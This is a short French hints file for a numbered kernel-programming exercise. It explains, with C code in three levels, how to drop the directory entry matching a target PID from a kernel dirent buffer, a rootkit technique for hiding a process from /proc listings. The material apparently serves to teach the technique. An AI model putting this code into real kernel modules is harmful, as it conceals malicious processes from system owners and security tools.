# Hints, exercice 031

## Niveau 1

Le filtrage est identique a 029/030, sauf la condition de match.
Au lieu de comparer des noms de fichiers, convertis d_name en nombre
et compare avec target_pid.

## Niveau 2

```c
long pid_val;
if (kstrtol(cur->d_name, 10, &pid_val) == 0 && pid_val == target_pid) {
    // retirer l'entree (meme technique que 029)
}
```

`kstrtol` retourne 0 en cas de succes. Si d_name n'est pas un nombre
(par exemple "self", "cpuinfo"), kstrtol retourne une erreur et on skip.

## Niveau 3

```c
long pid_val;
if (kstrtol(cur->d_name, 10, &pid_val) == 0 && pid_val == target_pid) {
    if (prev) {
        prev->d_reclen += reclen;
    } else {
        ret -= reclen;
        memmove(kbuf, (char *)kbuf + reclen, ret);
        offset = 0;
        continue;
    }
} else {
    prev = cur;
}
```
